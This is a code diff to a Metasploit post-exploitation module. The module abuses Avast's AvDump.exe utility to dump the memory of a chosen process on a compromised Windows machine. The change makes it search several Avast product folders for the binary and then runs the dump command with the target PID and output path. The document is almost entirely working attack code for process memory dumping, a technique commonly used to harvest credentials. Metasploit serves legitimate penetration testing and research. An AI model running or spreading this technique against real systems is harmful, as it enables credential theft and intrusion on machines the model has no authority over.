@@ -31,7 +31,19 @@ class MetasploitModule < Msf::Post
   end
 
   def avdump_exists?
-    file_exist?('C:\\Program Files\\Avast Software\\Avast\\AvDump.exe')
+    avdump_paths = [
+      'C:\\Program Files\\Avast Software\\Avast\\AvDump.exe',
+      'C:\\Program Files\\Avast Software\\BreachGuard\\AvDump.exe',
+      'C:\\Program Files\\Avast Software\\Cleanup\\AvDump.exe',
+      'C:\\Program Files\\Avast Software\\Driver Updater\\AvDump.exe',
+      'C:\\Program Files\\Avast Software\\SecureLine VPN\\AvDump.exe'
+    ]
+
+    avdump_paths.each do |p|
+      if file_exist?(p.to_s)
+        return p.to_s
+      end
+    end
   end
 
   def run
@@ -42,8 +54,8 @@ class MetasploitModule < Msf::Post
     dump_path = datastore['DUMP_PATH']
     pid = datastore['PID'].to_s
 
-    print_status("Executing Avast mem dump utility against #{pid} to #{dump_path}")
-    result = cmd_exec("C:\\Program Files\\Avast Software\\Avast\\AvDump.exe --pid #{pid} --exception_ptr 0 --thread_id 0 --dump_file \"#{dump_path}\" --min_interval 0")
+    print_status("Executing Avast memory dumping utility (#{avdump_exists?}) against pid #{pid} writing to #{dump_path}")
+    result = cmd_exec("#{avdump_exists?} --pid #{pid} --exception_ptr 0 --thread_id 0 --dump_file \"#{dump_path}\" --min_interval 0")
 
     fail_with(Failure::Unknown, "Dump file #{dump_path} was not created") unless file_exist?(dump_path)
     print_status(dump_path)
